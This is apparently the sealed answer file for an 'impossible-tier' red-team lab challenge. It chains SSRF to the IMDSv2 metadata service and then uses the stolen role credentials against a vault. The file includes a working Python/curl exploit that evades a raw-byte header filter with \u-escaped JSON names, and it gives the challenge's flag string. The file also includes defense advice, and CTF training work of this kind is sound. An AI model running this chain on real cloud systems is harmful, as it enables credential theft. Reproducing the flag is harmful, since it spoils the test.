# SEALED — answers withheld from SOLUTIONS.md

> These are the answers to **impossible-tier** challenges. They're kept out of
> `docs/SOLUTIONS.md` on purpose: the point of the impossible tier is that you know a
> solution *exists* (the reference `solve.py` proves it via `redsec selftest`) but you
> have to find it yourself. Open this only when you've truly given up.

---

## 09 · crown-jewel-chain  (impossible)

**Vector:** SSRF → IMDSv2 session credentials → second-service privilege abuse
(OWASP LLM02, OWASP ASI03 Identity & Privilege Abuse; MITRE ATLAS AML.T0040 /
AML.T0024; CSA MAESTRO L4). This is the lab form of the Capital One pattern, with
two extra locks that the easy SSRF challenge does not have.

1. **IMDSv1 is a dead end.** `GET /latest/meta-data/iam/security-credentials/role`
   still returns `REDSEC{infra_ssrf_to_cloud_metadata}`. The vault answers 403
   `imdsv1 session rejected` if you present that value. The crown jewel is not on
   the metadata service at all.
2. **IMDSv2.** `PUT /latest/api/token` with header
   `X-aws-ec2-metadata-token-ttl-seconds: <positive int>` returns a session token.
   `GET /latest/meta-data/iam/security-credentials/initrode-inference-role` with
   `X-aws-ec2-metadata-token: <that token>` returns a token-bound
   `SecretAccessKey`, the header name the vault wants (`CredentialHeader`), and
   the vault URL (`Vault`). None of those fields contain a `REDSEC{...}` flag.
3. **The egress guard is a parser differential.** `POST /fetch` now takes
   `method` and `headers`, but it refuses the request when the **raw body**
   contains `x-initrode-role`, `authorization`, `x-vault-token`, or
   `x-aws-ec2-metadata-token`. That last needle also matches the TTL header,
   because the TTL name has the token header as a prefix. The scan runs *before*
   JSON parsing, so it does not decode `\uXXXX` escapes. Escape the header
   **names** (not the values) and the parser reconstitutes them. The fetcher
   then performs the PUT and the GETs, which is what you need when the addresses
   in the identity document are only routable from the appserver.

```bash
APP=http://127.0.0.1:9090
META=$(curl -s $APP/debug/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["internal_endpoints"]["metadata"])')

APP="$APP" META="$META" python3 - <<'PY'
import json, os, httpx
app = os.environ["APP"].rstrip("/")
meta = os.environ["META"].rstrip("/")

def esc(name):
    # One backslash + u + 4 hex digits in the raw JSON body.
    return "".join("\\u%04x" % ord(c) for c in name)

def fetch(url, method="GET", headers=None):
    if not headers:
        header_json = "{}"
    else:
        header_json = "{" + ", ".join(
            '"%s": %s' % (esc(k), json.dumps(v)) for k, v in headers.items()
        ) + "}"
    body = '{"url": %s, "method": %s, "headers": %s}' % (
        json.dumps(url), json.dumps(method), header_json)
    return httpx.post(app + "/fetch", content=body.encode(),
                      headers={"content-type": "application/json"}, timeout=20).json()

tok = fetch(meta + "/latest/api/token", "PUT",
            {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})["body"].strip()
creds = json.loads(fetch(
    meta + "/latest/meta-data/iam/security-credentials/initrode-inference-role",
    "GET", {"X-aws-ec2-metadata-token": tok})["body"])
jewel = fetch(creds["Vault"], "GET", {creds["CredentialHeader"]: creds["SecretAccessKey"]})
print(jewel["body"])
PY
redsec submit 09 crown-jewel-chain 'REDSEC{infra_role_chain_to_crown_jewel}'
```

**Why it's hard:** the obvious follow-up (replay the IMDSv1 flag against whatever
the identity document points at) is rejected, and the obvious IMDSv2 attempt
(send the real header names through `/fetch`) is rejected by a guard that looks
like it understands credentials. It doesn't. It understands bytes. The vault URL
is also withheld from `/debug/config`; you only learn it from the v2 document.

**Lab note:** in `redsec dev` and in the container harness, target ports are
published, so you *can* talk to metadata and the vault directly. That is the same
property as the existing SSRF flag, which is also readable if you skip the
fetcher. The sealed path above uses only `POST /fetch`, because that is the path
that still works when those addresses are link-local. `solve.py` is written that
way, and the tests call it with **only** the appserver endpoint.

**Defense:** parse then decide — run the credential-header policy on the decoded
header map, not on the raw bytes. Prefer IMDSv2 with a hop limit of 1 so a
stolen SSRF cannot complete the PUT. Don't accept IMDSv1 credentials on internal
services (this vault doesn't, and that part is right). Bind the second service
to a workload identity the user-controlled fetcher cannot attach, or require
mTLS. An allow-list of fetch destinations beats a denylist of header spellings.
